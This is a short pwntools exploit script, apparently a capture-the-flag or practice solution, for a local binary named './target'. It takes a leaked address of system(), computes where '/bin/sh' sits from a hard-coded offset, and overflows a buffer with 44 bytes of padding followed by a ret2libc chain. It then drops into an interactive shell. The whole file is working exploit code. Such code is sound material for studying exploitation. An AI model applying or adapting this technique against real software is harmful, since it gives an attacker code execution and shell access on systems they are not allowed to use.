from pwn import *

# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']

p = process('./target')
#p = gdb.debug('./target', '''
#break *main
#break vuln
#''')

p.recvuntil('system @ ')
system_leak = int(p.recv(10), 16)

print 'system() system_leak: ', hex(system_leak)

pop_ebx = 0x0804901e
binsh = system_leak + 1362722

payload = ''
payload += 'A' * 44
payload += p32(system_leak)
payload += p32(pop_ebx)
payload += p32(binsh)

p.sendline(payload)
p.interactive()


